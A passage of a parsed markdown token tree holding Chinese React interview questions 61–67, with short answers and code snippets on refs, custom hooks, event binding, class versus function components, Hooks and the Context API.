级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"需要使用 useEffect 钩子，并将对象的字段作为依赖数组传递。","text":"需要使用 useEffect 钩子，并将对象的字段作为依赖数组传递。","tokens":[{"type":"text","raw":"需要使用 useEffect 钩子，并将对象的字段作为依赖数组传递。","text":"需要使用 useEffect 钩子，并将对象的字段作为依赖数组传递。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n\\nuseEffect(() => {\\n  console.log(\'Changed!\')\\n}, [obj.someField])\\n\\n```","lang":"js","text":"\\nuseEffect(() => {\\n  console.log(\'Changed!\')\\n}, [obj.someField])\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 61. 如何访问DOM元素？\\n\\n","depth":2,"text":"61. 如何访问DOM元素？","tokens":[{"type":"text","raw":"61. 如何访问DOM元素？","text":"61. 如何访问DOM元素？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"引用是使用 React.createRef() 或 useRef() 钩子创建的，并通过 ref 属性附加到 React 元素上。通过访问创建的引用，我们可以使用 ref.current 访问 DOM 元素。","text":"引用是使用 React.createRef() 或 useRef() 钩子创建的，并通过 ref 属性附加到 React 元素上。通过访问创建的引用，我们可以使用 ref.current 访问 DOM 元素。","tokens":[{"type":"text","raw":"引用是使用 React.createRef() 或 useRef() 钩子创建的，并通过 ref 属性附加到 React 元素上。通过访问创建的引用，我们可以使用 ref.current 访问 DOM 元素。","text":"引用是使用 React.createRef() 或 useRef() 钩子创建的，并通过 ref 属性附加到 React 元素上。通过访问创建的引用，我们可以使用 ref.current 访问 DOM 元素。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n\\nconst App = () => {\\n  const myRef = useRef(null);\\n\\n  const handleClick = () => {\\n    console.log(myRef.current); // Accessing the DOM element\\n  };\\n\\n  return (\\n    <div>\\n      <input type=\\"text\\" ref={myRef} />\\n      <button onClick={handleClick}>Click Me</button>\\n    </div>\\n  );\\n}\\n\\nexport default App;\\n\\n```","lang":"js","text":"\\nconst App = () => {\\n  const myRef = useRef(null);\\n\\n  const handleClick = () => {\\n    console.log(myRef.current); // Accessing the DOM element\\n  };\\n\\n  return (\\n    <div>\\n      <input type=\\"text\\" ref={myRef} />\\n      <button onClick={handleClick}>Click Me</button>\\n    </div>\\n  );\\n}\\n\\nexport default App;\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 62. 创建自定义钩子的规则是什么？\\n\\n","depth":2,"text":"62. 创建自定义钩子的规则是什么？","tokens":[{"type":"text","raw":"62. 创建自定义钩子的规则是什么？","text":"62. 创建自定义钩子的规则是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 钩子名称以 \\"use \\"开头。\\n\\n- 钩子只能从其他钩子或 React 元素中调用。\\n\\n- 不要有条件地调用钩子。\\n\\n- 将可重复使用的逻辑提取到自定义钩子中。\\n\\n- 自定义钩子必须是纯函数。\\n\\n- 自定义钩子可以返回值或其他钩子。\\n\\n- 以描述性的方式命名自定义钩子。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 钩子名称以 \\"use \\"开头。\\n\\n","task":false,"loose":true,"text":"钩子名称以 \\"use \\"开头。\\n","tokens":[{"type":"text","raw":"钩子名称以 \\"use \\"开头。\\n","text":"钩子名称以 \\"use \\"开头。","tokens":[{"type":"text","raw":"钩子名称以 \\"use \\"开头。","text":"钩子名称以 \\"use \\"开头。","escaped":false}]}]},{"type":"list_item","raw":"- 钩子只能从其他钩子或 React 元素中调用。\\n\\n","task":false,"loose":true,"text":"钩子只能从其他钩子或 React 元素中调用。\\n","tokens":[{"type":"text","raw":"钩子只能从其他钩子或 React 元素中调用。\\n","text":"钩子只能从其他钩子或 React 元素中调用。","tokens":[{"type":"text","raw":"钩子只能从其他钩子或 React 元素中调用。","text":"钩子只能从其他钩子或 React 元素中调用。","escaped":false}]}]},{"type":"list_item","raw":"- 不要有条件地调用钩子。\\n\\n","task":false,"loose":true,"text":"不要有条件地调用钩子。\\n","tokens":[{"type":"text","raw":"不要有条件地调用钩子。\\n","text":"不要有条件地调用钩子。","tokens":[{"type":"text","raw":"不要有条件地调用钩子。","text":"不要有条件地调用钩子。","escaped":false}]}]},{"type":"list_item","raw":"- 将可重复使用的逻辑提取到自定义钩子中。\\n\\n","task":false,"loose":true,"text":"将可重复使用的逻辑提取到自定义钩子中。\\n","tokens":[{"type":"text","raw":"将可重复使用的逻辑提取到自定义钩子中。\\n","text":"将可重复使用的逻辑提取到自定义钩子中。","tokens":[{"type":"text","raw":"将可重复使用的逻辑提取到自定义钩子中。","text":"将可重复使用的逻辑提取到自定义钩子中。","escaped":false}]}]},{"type":"list_item","raw":"- 自定义钩子必须是纯函数。\\n\\n","task":false,"loose":true,"text":"自定义钩子必须是纯函数。\\n","tokens":[{"type":"text","raw":"自定义钩子必须是纯函数。\\n","text":"自定义钩子必须是纯函数。","tokens":[{"type":"text","raw":"自定义钩子必须是纯函数。","text":"自定义钩子必须是纯函数。","escaped":false}]}]},{"type":"list_item","raw":"- 自定义钩子可以返回值或其他钩子。\\n\\n","task":false,"loose":true,"text":"自定义钩子可以返回值或其他钩子。\\n","tokens":[{"type":"text","raw":"自定义钩子可以返回值或其他钩子。\\n","text":"自定义钩子可以返回值或其他钩子。","tokens":[{"type":"text","raw":"自定义钩子可以返回值或其他钩子。","text":"自定义钩子可以返回值或其他钩子。","escaped":false}]}]},{"type":"list_item","raw":"- 以描述性的方式命名自定义钩子。","task":false,"loose":true,"text":"以描述性的方式命名自定义钩子。","tokens":[{"type":"text","raw":"以描述性的方式命名自定义钩子。","text":"以描述性的方式命名自定义钩子。","tokens":[{"type":"text","raw":"以描述性的方式命名自定义钩子。","text":"以描述性的方式命名自定义钩子。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 63. 如何不使用脚手架创建一个项目\\n\\n","depth":2,"text":"63. 如何不使用脚手架创建一个项目","tokens":[{"type":"text","raw":"63. 如何不使用脚手架创建一个项目","text":"63. 如何不使用脚手架创建一个项目","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"1. yarn init 初始化package.json文件\\n\\n2. 安装react和react-dom\\n\\n3. 配置webpack\\n\\n4. 安装router\\n\\n5. 安装redux","ordered":true,"start":1,"loose":true,"items":[{"type":"list_item","raw":"1. yarn init 初始化package.json文件\\n\\n","task":false,"loose":true,"text":"yarn init 初始化package.json文件\\n","tokens":[{"type":"text","raw":"yarn init 初始化package.json文件\\n","text":"yarn init 初始化package.json文件","tokens":[{"type":"text","raw":"yarn init 初始化package.json文件","text":"yarn init 初始化package.json文件","escaped":false}]}]},{"type":"list_item","raw":"2. 安装react和react-dom\\n\\n","task":false,"loose":true,"text":"安装react和react-dom\\n","tokens":[{"type":"text","raw":"安装react和react-dom\\n","text":"安装react和react-dom","tokens":[{"type":"text","raw":"安装react和react-dom","text":"安装react和react-dom","escaped":false}]}]},{"type":"list_item","raw":"3. 配置webpack\\n\\n","task":false,"loose":true,"text":"配置webpack\\n","tokens":[{"type":"text","raw":"配置webpack\\n","text":"配置webpack","tokens":[{"type":"text","raw":"配置webpack","text":"配置webpack","escaped":false}]}]},{"type":"list_item","raw":"4. 安装router\\n\\n","task":false,"loose":true,"text":"安装router\\n","tokens":[{"type":"text","raw":"安装router\\n","text":"安装router","tokens":[{"type":"text","raw":"安装router","text":"安装router","escaped":false}]}]},{"type":"list_item","raw":"5. 安装redux","task":false,"loose":true,"text":"安装redux","tokens":[{"type":"text","raw":"安装redux","text":"安装redux","tokens":[{"type":"text","raw":"安装redux","text":"安装redux","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 64. react事件绑定方式有哪些\\n\\n","depth":2,"text":"64. react事件绑定方式有哪些","tokens":[{"type":"text","raw":"64. react事件绑定方式有哪些","text":"64. react事件绑定方式有哪些","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"paragraph","raw":"render方法中使用bind","text":"render方法中使用bind","tokens":[{"type":"text","raw":"render方法中使用bind","text":"render方法中使用bind","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```html\\n<div onClick={this.handleClick.bind(this)}>test</div>\\n\\n```","lang":"html","text":"<div onClick={this.handleClick.bind(this)}>test</div>\\n"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"这种方式在组件每次render渲染的时候，都会重新进行bind的操作，影响性能","text":"这种方式在组件每次render渲染的时候，都会重新进行bind的操作，影响性能","tokens":[{"type":"text","raw":"这种方式在组件每次render渲染的时候，都会重新进行bind的操作，影响性能","text":"这种方式在组件每次render渲染的时候，都会重新进行bind的操作，影响性能","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"render方法中使用箭头函数","text":"render方法中使用箭头函数","tokens":[{"type":"text","raw":"render方法中使用箭头函数","text":"render方法中使用箭头函数","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```html\\n<div onClick={e => this.handleClick(e)}>test</div>\\n\\n```","lang":"html","text":"<div onClick={e => this.handleClick(e)}>test</div>\\n"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"这种方式在组件每次render渲染的时候，都会重新进行bind的操作，影响性能","text":"这种方式在组件每次render渲染的时候，都会重新进行bind的操作，影响性能","tokens":[{"type":"text","raw":"这种方式在组件每次render渲染的时候，都会重新进行bind的操作，影响性能","text":"这种方式在组件每次render渲染的时候，都会重新进行bind的操作，影响性能","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"constructor中bind","text":"constructor中bind","tokens":[{"type":"text","raw":"constructor中bind","text":"constructor中bind","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```html\\n\\nthis.handleClick = this.handleClick.bind(this);\\n\\n```","lang":"html","text":"\\nthis.handleClick = this.handleClick.bind(this);\\n"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"定义阶段使用箭头函数绑定","text":"定义阶段使用箭头函数绑定","tokens":[{"type":"text","raw":"定义阶段使用箭头函数绑定","text":"定义阶段使用箭头函数绑定","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 65. react函数组件和类组件的区别\\n\\n","depth":2,"text":"65. react函数组件和类组件的区别","tokens":[{"type":"text","raw":"65. react函数组件和类组件的区别","text":"65. react函数组件和类组件的区别","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 编写形式：类组件的编写形式更加的冗余\\n\\n- 状态管理：在hooks之前函数组件没有状态，在hooks提出之后，函数组件也可以维护自身的状态\\n\\n- 生命周期：函数组件没有生命周期，这是因为生命周期钩子都来自于继承的React.Component，但是可以通过useEffect实现类似生命周期的效果\\n\\n- 调用方式：函数组件通过执行函数调用，类组件通过实例化然后调用实例的render方法\\n\\n- 获取渲染的值：函数组件存在闭包陷阱，类组件不存在（Props在 React中是不可变的所以它永远不会改变，但是 this 总是可变的，以便您可以在 render 和生命周期函数中读取新版本）","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 编写形式：类组件的编写形式更加的冗余\\n\\n","task":false,"loose":true,"text":"编写形式：类组件的编写形式更加的冗余\\n","tokens":[{"type":"text","raw":"编写形式：类组件的编写形式更加的冗余\\n","text":"编写形式：类组件的编写形式更加的冗余","tokens":[{"type":"text","raw":"编写形式：类组件的编写形式更加的冗余","text":"编写形式：类组件的编写形式更加的冗余","escaped":false}]}]},{"type":"list_item","raw":"- 状态管理：在hooks之前函数组件没有状态，在hooks提出之后，函数组件也可以维护自身的状态\\n\\n","task":false,"loose":true,"text":"状态管理：在hooks之前函数组件没有状态，在hooks提出之后，函数组件也可以维护自身的状态\\n","tokens":[{"type":"text","raw":"状态管理：在hooks之前函数组件没有状态，在hooks提出之后，函数组件也可以维护自身的状态\\n","text":"状态管理：在hooks之前函数组件没有状态，在hooks提出之后，函数组件也可以维护自身的状态","tokens":[{"type":"text","raw":"状态管理：在hooks之前函数组件没有状态，在hooks提出之后，函数组件也可以维护自身的状态","text":"状态管理：在hooks之前函数组件没有状态，在hooks提出之后，函数组件也可以维护自身的状态","escaped":false}]}]},{"type":"list_item","raw":"- 生命周期：函数组件没有生命周期，这是因为生命周期钩子都来自于继承的React.Component，但是可以通过useEffect实现类似生命周期的效果\\n\\n","task":false,"loose":true,"text":"生命周期：函数组件没有生命周期，这是因为生命周期钩子都来自于继承的React.Component，但是可以通过useEffect实现类似生命周期的效果\\n","tokens":[{"type":"text","raw":"生命周期：函数组件没有生命周期，这是因为生命周期钩子都来自于继承的React.Component，但是可以通过useEffect实现类似生命周期的效果\\n","text":"生命周期：函数组件没有生命周期，这是因为生命周期钩子都来自于继承的React.Component，但是可以通过useEffect实现类似生命周期的效果","tokens":[{"type":"text","raw":"生命周期：函数组件没有生命周期，这是因为生命周期钩子都来自于继承的React.Component，但是可以通过useEffect实现类似生命周期的效果","text":"生命周期：函数组件没有生命周期，这是因为生命周期钩子都来自于继承的React.Component，但是可以通过useEffect实现类似生命周期的效果","escaped":false}]}]},{"type":"list_item","raw":"- 调用方式：函数组件通过执行函数调用，类组件通过实例化然后调用实例的render方法\\n\\n","task":false,"loose":true,"text":"调用方式：函数组件通过执行函数调用，类组件通过实例化然后调用实例的render方法\\n","tokens":[{"type":"text","raw":"调用方式：函数组件通过执行函数调用，类组件通过实例化然后调用实例的render方法\\n","text":"调用方式：函数组件通过执行函数调用，类组件通过实例化然后调用实例的render方法","tokens":[{"type":"text","raw":"调用方式：函数组件通过执行函数调用，类组件通过实例化然后调用实例的render方法","text":"调用方式：函数组件通过执行函数调用，类组件通过实例化然后调用实例的render方法","escaped":false}]}]},{"type":"list_item","raw":"- 获取渲染的值：函数组件存在闭包陷阱，类组件不存在（Props在 React中是不可变的所以它永远不会改变，但是 this 总是可变的，以便您可以在 render 和生命周期函数中读取新版本）","task":false,"loose":true,"text":"获取渲染的值：函数组件存在闭包陷阱，类组件不存在（Props在 React中是不可变的所以它永远不会改变，但是 this 总是可变的，以便您可以在 render 和生命周期函数中读取新版本）","tokens":[{"type":"text","raw":"获取渲染的值：函数组件存在闭包陷阱，类组件不存在（Props在 React中是不可变的所以它永远不会改变，但是 this 总是可变的，以便您可以在 render 和生命周期函数中读取新版本）","text":"获取渲染的值：函数组件存在闭包陷阱，类组件不存在（Props在 React中是不可变的所以它永远不会改变，但是 this 总是可变的，以便您可以在 render 和生命周期函数中读取新版本）","tokens":[{"type":"text","raw":"获取渲染的值：函数组件存在闭包陷阱，类组件不存在（Props在 React中是不可变的所以它永远不会改变，但是 this 总是可变的，以便您可以在 render 和生命周期函数中读取新版本）","text":"获取渲染的值：函数组件存在闭包陷阱，类组件不存在（Props在 React中是不可变的所以它永远不会改变，但是 this 总是可变的，以便您可以在 render 和生命周期函数中读取新版本）","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 66. 说说React Hooks是如何解决类组件中一些常见问题的\\n\\n","depth":2,"text":"66. 说说React Hooks是如何解决类组件中一些常见问题的","tokens":[{"type":"text","raw":"66. 说说React Hooks是如何解决类组件中一些常见问题的","text":"66. 说说React Hooks是如何解决类组件中一些常见问题的","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- React Hooks允许我们在不编写class的情况下使用state以及其他的React特性。\\n\\n- 这解决了类组件中一些常见问题，如代码复用困难、逻辑难以拆分以及生命周期方法难以管理等。\\n\\n- 通过使用Hooks，我们可以将组件逻辑提取到可重用的函数中，使得代码更加简洁、易读和可维护。\\n\\n- 此外，Hooks还提供了更灵活的方式来管理组件的状态和生命周期，使得组件逻辑更加清晰和可预测。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- React Hooks允许我们在不编写class的情况下使用state以及其他的React特性。\\n\\n","task":false,"loose":true,"text":"React Hooks允许我们在不编写class的情况下使用state以及其他的React特性。\\n","tokens":[{"type":"text","raw":"React Hooks允许我们在不编写class的情况下使用state以及其他的React特性。\\n","text":"React Hooks允许我们在不编写class的情况下使用state以及其他的React特性。","tokens":[{"type":"text","raw":"React Hooks允许我们在不编写class的情况下使用state以及其他的React特性。","text":"React Hooks允许我们在不编写class的情况下使用state以及其他的React特性。","escaped":false}]}]},{"type":"list_item","raw":"- 这解决了类组件中一些常见问题，如代码复用困难、逻辑难以拆分以及生命周期方法难以管理等。\\n\\n","task":false,"loose":true,"text":"这解决了类组件中一些常见问题，如代码复用困难、逻辑难以拆分以及生命周期方法难以管理等。\\n","tokens":[{"type":"text","raw":"这解决了类组件中一些常见问题，如代码复用困难、逻辑难以拆分以及生命周期方法难以管理等。\\n","text":"这解决了类组件中一些常见问题，如代码复用困难、逻辑难以拆分以及生命周期方法难以管理等。","tokens":[{"type":"text","raw":"这解决了类组件中一些常见问题，如代码复用困难、逻辑难以拆分以及生命周期方法难以管理等。","text":"这解决了类组件中一些常见问题，如代码复用困难、逻辑难以拆分以及生命周期方法难以管理等。","escaped":false}]}]},{"type":"list_item","raw":"- 通过使用Hooks，我们可以将组件逻辑提取到可重用的函数中，使得代码更加简洁、易读和可维护。\\n\\n","task":false,"loose":true,"text":"通过使用Hooks，我们可以将组件逻辑提取到可重用的函数中，使得代码更加简洁、易读和可维护。\\n","tokens":[{"type":"text","raw":"通过使用Hooks，我们可以将组件逻辑提取到可重用的函数中，使得代码更加简洁、易读和可维护。\\n","text":"通过使用Hooks，我们可以将组件逻辑提取到可重用的函数中，使得代码更加简洁、易读和可维护。","tokens":[{"type":"text","raw":"通过使用Hooks，我们可以将组件逻辑提取到可重用的函数中，使得代码更加简洁、易读和可维护。","text":"通过使用Hooks，我们可以将组件逻辑提取到可重用的函数中，使得代码更加简洁、易读和可维护。","escaped":false}]}]},{"type":"list_item","raw":"- 此外，Hooks还提供了更灵活的方式来管理组件的状态和生命周期，使得组件逻辑更加清晰和可预测。","task":false,"loose":true,"text":"此外，Hooks还提供了更灵活的方式来管理组件的状态和生命周期，使得组件逻辑更加清晰和可预测。","tokens":[{"type":"text","raw":"此外，Hooks还提供了更灵活的方式来管理组件的状态和生命周期，使得组件逻辑更加清晰和可预测。","text":"此外，Hooks还提供了更灵活的方式来管理组件的状态和生命周期，使得组件逻辑更加清晰和可预测。","tokens":[{"type":"text","raw":"此外，Hooks还提供了更灵活的方式来管理组件的状态和生命周期，使得组件逻辑更加清晰和可预测。","text":"此外，Hooks还提供了更灵活的方式来管理组件的状态和生命周期，使得组件逻辑更加清晰和可预测。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 67. 说说React的Context API及其使用场景\\n\\n","depth":2,"text":"67. 说说React的Context API及其使用场景","tokens":[{"type":"text","raw":"67. 说说React的Context API及其使用场景","text":"67. 说说React的Context API及其使用场景","escaped":false}]},{"type":"heading","raw":"#### 类型：`编程`\\n\\n","depth":4,"text":"类型：`编程`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`编程`","text":"编程"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- React的Context API提供了一种在组件树中传递数据的方式，而无需手动逐层传递props。\\n\\n- 它特别适用于跨多个层级共享数据或状态的情况，如主题、用户信息等。\\n\\n- 使用Context API可以简化代码结构，避免prop drilling（属性穿透）的问题，并提高组件的复用性。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- React的Context API提供了一种在组件树中传递数据的方式，而无需手动逐层传递props。\\n\\n","task":false,"loose":true,"text":"React的Context API提供了一种在组件树中传递数据的方式，而无需手动逐层传递props。\\n","tokens":[{"type":"text","raw":"React的Context API提供了一种在组件树中传递数据的方式，而无需手动逐层传递props。\\n","text":"React的Context API提供了一种在组件树中传递数据的方式，而无需手动逐层传递props。","tokens":[{"type":"text","raw":"React的Context API提供了一种在组件树中传递数据的方式，而无需手动逐层传递props。","text":"React的Context API提供了一种在组件树中传递数据的方式，而无需手动逐层传递props。","escaped":false}]}]},{"type":"list_item","raw":"- 它特别适用于跨多个层级共享数据或状态的情况，如主题、用户信息等。\\n\\n","task":false,"loose":true,"text":"它特别适用于跨多个层级共享数据或状态的情况，如主题、用户信息等。\\n","tokens":[{"type":"text","raw":"它特别适用于跨多个层级共享数据或状态的情况，如主题、用户信息等。\\n","text":"它特别适用于跨多个层级共享数据或状态的情况，如主题、用户信息等。","tokens":[{"type":"text","raw":"它特别适用于跨多个层级共享数据或状态的情况，如主题、用户信息等。","text":"它特别适用于跨多个层级共享数据或状态的情况，如主题、用户信息等。","escaped":false}]}]},{"type":"list_item","raw":"- 使用Context API可以简化代码结构，避免prop drilling（属性穿透）的问题，并提高组件的复用性。","task":false,"loose":true,"text":"使用Context API可以简化代码结构，避免prop drilling（属性穿透）的问题，并提高组件的复用性。","tokens":[{"type":"text","raw":"使用Context API可以简化代码结构，避免prop drilling（属性穿透）的问题，并提高组件的复用性。","text":"使用Context 